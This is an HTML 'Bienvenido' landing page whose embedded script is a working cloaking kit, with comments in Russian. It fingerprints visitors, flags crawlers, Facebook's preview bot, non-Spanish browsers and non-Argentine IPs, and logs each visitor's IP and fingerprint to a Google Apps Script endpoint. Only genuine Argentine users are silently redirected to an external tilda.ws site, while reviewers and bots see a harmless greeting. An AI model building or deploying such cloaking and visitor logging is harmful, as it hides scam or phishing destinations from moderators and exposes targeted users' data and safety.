<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Bienvenido</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 30vh; }
  </style>
</head>
<body>
  <h1>Bienvenido</h1>

  <script>
    async function detect() {
      const ua = navigator.userAgent || '';
      const lang = navigator.language || '';
      const width = screen.width || 0;
      const webdriver = navigator.webdriver ? '1' : '0';

      // Фильтры
      const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
      const isUASuspicious = suspiciousUAs.some(rx => rx.test(ua));
      const isLangSuspicious = !lang.includes('es');
      const isScreenSuspicious = width < 300 || width > 2000;

      let ip = '_', country = '_';
      try {
        const res = await fetch('https://ipapi.co/json/');
        const json = await res.json();
        ip = json.ip;
        country = json.country || '_';
      } catch (e) {}

      const isBot =
        webdriver === '1' ||
        isUASuspicious ||
        isLangSuspicious ||
        isScreenSuspicious ||
        country !== 'AR'; // ← теперь фильтрация работает

      // Лог
      fetch('https://script.google.com/macros/s/AKfycbzeF5L5c3qDt5DSzQ6Cuv2FMLanBviy-9aMl-J5WxelYIxraRZrIM042UAr3g8mh6gJ-g/exec', {
        method: 'POST',
        body: JSON.stringify({
          ip,
          country,
          ua,
          lang,
          width,
          webdriver,
          result: isBot ? 'bot' : 'ok'
        })
      });

      // Редирект
      if (!isBot) {
        setTimeout(() => {
          window.location.href = 'http://argentinaforreal.tilda.ws/';
        }, 1200);
      } else {
        document.querySelector('h1').textContent = 'Gracias por visitar';
      }
    }

    detect();
  </script>
</body>
</html>
